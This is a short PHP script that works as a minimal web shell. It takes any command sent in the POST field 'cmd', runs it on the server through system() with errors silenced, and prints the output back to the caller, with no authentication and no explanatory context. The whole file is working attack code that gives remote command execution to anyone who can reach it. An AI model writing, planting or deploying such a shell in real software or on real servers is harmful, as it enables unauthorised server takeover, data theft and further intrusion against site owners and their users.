<?php
function Exec_Run($cmd)
{
	$res = '';
	@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();
	return $res;
}

if(!empty($_POST['cmd'])){
	$res = Exec_Run($_POST['cmd']);
	echo $res;
}
?>